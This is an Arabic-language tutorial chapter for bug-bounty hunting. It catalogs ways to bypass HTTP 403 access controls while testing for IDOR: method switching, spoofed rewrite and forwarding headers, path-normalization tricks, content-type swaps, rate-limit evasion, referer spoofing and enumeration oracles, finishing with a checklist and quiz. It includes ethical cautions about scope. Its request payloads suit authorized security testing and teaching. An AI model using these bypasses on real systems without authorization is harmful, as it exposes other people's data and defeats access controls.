# 8️⃣ دليل التخطي — لما الـ 403 يطلع لك

> **تذكّر**: الـ `403` مش نهاية. الـ 403 بيقولك **"الكائن موجود والـ endpoint شغال"**.
> يبقى لسه فيه أمل. الـ `404` على كل حاجة هو اللي يخلّيك تمشي.

---

## 🧭 خريطة القرار

```
GET /api/orders/8821
      │
      ├─ 200 ببياناتك        ← طبيعي، كمل
      ├─ 200 ببيانات تانية   ← 🎉 IDOR
      ├─ 401                 ← فحص هوية بس، مفيش فحص ملكية؟ جرّب توكن تاني
      ├─ 403                 ← 👈 الكائن موجود! طبّق البلايبوك ده
      ├─ 404 (حتى على IDs صحيحة) ← الـ endpoint بيخفي الوجود، جرّب تقنيات تانية
      └─ 500                 ← الـ ID بصيغة غلط، جرّب صيغة تانية
```

---

## 🛠️ التقنيات (مرتبة بالعائد)

### 1️⃣ تبديل الـ HTTP Method ⭐⭐⭐⭐⭐
```http
GET    /api/orders/8821  →  403
POST   /api/orders/8821  →  200
PATCH  /api/orders/8821  →  200
PUT    /api/orders/8821  →  200
HEAD   /api/orders/8821  →  ?
```
👈 أعلى نسبة نجاح. الفرق بتفلتر على `GET` بس.

### 2️⃣ هيدرات إعادة الكتابة (Rewrite Headers) ⭐⭐⭐⭐
كتير من الـ reverse proxies (nginx, Apache, Varnish) بتثق في الهيدرات دي:

```http
X-Original-URL: /api/orders/8821
X-Rewrite-URL: /api/orders/8821
X-Original-URI: /api/orders/8821
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: localhost
X-Forwarded-Host: localhost
```

الطريقة:
```http
GET /api/orders/any_id HTTP/1.1          ← path مقبول
X-Original-URL: /api/orders/8821         ← الحقيقي
→ 200 ببيانات 8821 ✅
```

### 3️⃣ التلاعب بالمسار (Path Normalization) ⭐⭐⭐⭐
```http
GET /api/orders/8821/          trailing slash
GET /api/orders//8821          double slash
GET /api/./orders/8821         dot segment
GET /api/foo/../orders/8821    traversal في المنتصف
GET /api/orders/8821;.js       suffix
GET /api/orders/8821;          semicolon
GET /api/orders/8821%09        tab
GET /api/orders/8821%20        space
GET /api/orders/8821%00        null byte
GET /API/orders/8821           case
GET /api/orders/%38821         overlong utf8
```

### 4️⃣ تبديل الـ Content-Type ⭐⭐⭐
```http
# الأصل (مرفوض)
POST /api/orders  Content-Type: application/json
{"order_id": 8821}                         → 403

# التجربة
POST /api/orders  Content-Type: application/xml
<order_id>8821</order_id>                  → 200؟

POST /api/orders  Content-Type: application/x-www-form-urlencoded
order_id=8821                              → 200?
```

### 5️⃣ تغليف/تسمية البارامتر ⭐⭐⭐
```json
{"id": 8821}              →  {"order": {"id": 8821}}
                          →  {"orderId": 8821}
                          →  {"data": {"id": 8821}}
                          →  {"id": "8821"}        (string)
                          →  {"id": 8821, "order_id": 9999}   ← تناقض
```

### 6️⃣ تخطي الـ Rate Limit على تخمين المعرّفات ⭐⭐⭐
```http
# لو الـ API بيحدّ الطلبات على الـ IP
X-Forwarded-For: 1.2.3.4        ← بدّله كل مرة
X-Originating-IP: 1.2.3.4
X-Real-IP: 1.2.3.4

# أو GraphQL aliases
{ a: order(id:1){x} b: order(id:2){x} ... }   ← 1000 في request واحد

# أو array في request واحد
GET /api/orders?ids[]=1&ids[]=2&...&ids[]=500
```

### 7️⃣ تخطي فحص الـ Referer / Origin ⭐⭐
```http
Referer: https://app.target.com/admin
Origin: https://app.target.com
X-Requested-From: https://app.target.com
```

### 8️⃣ استغلال الـ HTTP Request Smuggling (متقدم)
- `Content-Length` + `Transfer-Encoding` مع بعض
- CL.TE / TE.CL
- بيخليك تسبق طلب ضحية وتقرأ ردّه
- متقدم — اتركه لما تتقن الأساسيات

---

## 🔍 تقنيات الاستدلال (Oracles) — لما مفيش بيانات بترجع

### أ. الـ Error-Based Oracle
```http
GET /api/orders/8821   →  403 "Not your order"
GET /api/orders/99999  →  404 "Order not found"
```
رسايل مختلفة = بتأكد وجود الكائن. استخدم الفرق لتعداد IDs صحيحة.

### ب. الـ Timing Oracle
لو الاستعلام على ID موجود أبطأ من غير الموجود (DB lookup)
→ تقدر تعدّد بالتوقيت.

### ج. الـ Boolean Oracle في الـ Filters
```http
GET /api/orders?filter=status:paid        → 200
GET /api/orders?filter=user_id:42         → 200 ببيانات 42؟
```

### د. حقول الـ Response
```http
GET /api/orders/8821 → 403
لكن:
GET /api/orders?ids=8821 → 200 بـ metadata بس (count, exists: true)
```

---

## 🧨 الجمع بين التقنيات

السيناريو الواقعي غالبًا محتاج **أكتر من تقنية**:

```
GET /api/v1/admin/users/42
  → 403
      ↓
جرّب: X-Original-URL: /api/v1/admin/users/42
  → 403
      ↓
جرّب: POST بدل GET + X-Original-URL
  → 403
      ↓
جرّب: Content-Type: xml + POST + X-Original-URL
  → 200 ✅  ← نجح!
```

**الخلاصة**: متجرّبش تقنية واحدة وتمشي. اجمعها.

---

## ⚠️ تنبيهات أخلاقية وتقنية

| ❌ متعملش | السبب |
|---|---|
| متحاولش تكسر الـ WAF بأسلوب عنيف | هيحظرك وبيوقع السيرفر |
| متعملش آلاف الطلبات | `429` أو حظر IP أو إبلاغ |
| متستغلش حاجة بره الـ Scope | قانونيًا خطير |
| متعدّلش/تحذفش بيانات ضحية | غير أخلاقي وغير قانوني |

✅ لو وصلت لبيانات حقيقية: **وقف فورًا**، خُد أقل قدر يثبت الوجود، واكتب التقرير.

---

## 📋 Checklist التخطي السريع

```
[ ] غيّر method (POST/PUT/PATCH/DELETE/HEAD)
[ ] X-Original-URL / X-Rewrite-URL
[ ] X-Forwarded-For: 127.0.0.1
[ ] trailing slash / // / ; / .
[ ] تغيير حالة المسار (case)
[ ] %09 %20 %00 suffix
[ ] Content-Type: xml/form/multipart
[ ] غلّف البارامتر / غيّر اسمه
[ ] Referer / Origin
[ ] جرّب endpoint موازي (/api/v1 vs /api/v2 vs /internal)
[ ] جرّب subdomain تاني (api. vs app. vs internal.)
[ ] جرّب الـ ID بصيغة تانية (string/int/hex/base64)
[ ] جرّب path traversal في أول المسار
```

---

## 🎓 نصيحة المعلم

> الـ 403 مش "لا". الـ 403 هو **"حاول تاني بطريقة تانية"**.
>
> كل ثغرة لقيتها في حياتي كانت وراها في المتوسط 6 محاولات فاشلة.
> الفرق بيني وبين اللي مالقاش حاجة: إني جرّبت المحاولة السابعة.

---

## ✅ اختبر نفسك

1. الـ 403 بيقولك إيه بالظبط؟ وليه مش نهاية؟
2. اذكر 4 هيدرات لإعادة الكتابة.
3. إزاي تخطّي rate limit على تخمين المعرّفات؟
4. إيه الـ Error-Based Oracle؟
